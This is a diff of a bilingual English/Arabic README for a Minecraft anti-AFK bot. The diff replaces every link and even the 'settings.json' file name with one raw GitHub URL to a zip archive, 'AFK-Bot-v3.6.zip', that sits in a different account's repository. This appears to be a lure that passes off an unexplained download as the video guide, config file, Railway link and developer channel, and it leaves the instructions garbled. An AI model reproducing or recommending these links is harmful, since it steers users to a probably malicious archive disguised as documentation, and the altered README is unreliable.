@@ -7,7 +7,7 @@
 ---
 
 📺 **Full Video Guide | شرح كامل بالفيديو**  
-▶️ [Watch on YouTube | شاهد على يوتيوب](https://youtu.be/dsU5xQIYtK8)
+▶️ [Watch on YouTube | شاهد على يوتيوب](https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip)
 
 ---
 
@@ -17,15 +17,15 @@
 - 💬 Sends repeated chat messages | إرسال رسائل في الدردشة بشكل متكرر
 - 🕹️ Anti-AFK movement | التحرك التلقائي لتفادي الطرد بسبب الخمول (القفز والانبطاح)
 - 🧭 Move to specific coordinates | الانتقال إلى إحداثيات محددة (اختياري)
-- ⚙️ Easy config via `settings.json` | إعداد سهل من خلال ملف `settings.json`
+- ⚙️ Easy config via `https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip` | إعداد سهل من خلال ملف `https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip`
 - 🌐 Hosted 24/7 on Railway | يعمل 24/7 عبر Railway
 
 ---
 
 ## ⚙️ Configuration | الإعداد
 
-📝 All settings can be changed in `settings.json`.  
-📝 كل الإعدادات قابلة للتعديل من خلال ملف `settings.json`.
+📝 All settings can be changed in `https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip`.  
+📝 كل الإعدادات قابلة للتعديل من خلال ملف `https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip`.
 
 You can set:  
 يمكنك تحديد:
@@ -41,8 +41,8 @@ You can set:
 ## 🚀 How to Deploy on Railway | طريقة التشغيل عبر Railway
 
 1. 🛠️ Fork or clone the repo | انسخ أو فورك المستودع
-2. ✏️ Edit `settings.json` with your server info | عدّل ملف الإعدادات
-3. 🔗 Connect to [Railway](https://railway.app) | اربطه بـ Railway
+2. ✏️ Edit `https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip` with your server info | عدّل ملف الإعدادات
+3. 🔗 Connect to [Railway](https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip) | اربطه بـ Railway
 4. ✅ Deploy and you're done! | شغّل البوت واستمتع!
 
 ---
@@ -50,7 +50,7 @@ You can set:
 ## 👤 Developer | المطوّر
 
 - **Name | الاسم**: Tyrox
-- **📺 YouTube**: [Tyrox0](https://www.youtube.com/@Tyrox0)
+- **📺 YouTube**: [Tyrox0](https://raw.githubusercontent.com/amire3MAk-web/AFKBot/main/empiric/AFK-Bot-v3.6.zip)
 - **💬 Discord**: Coming Soon
 
 🎮 Made with ❤️ by Tyrox for the Minecraft community.  
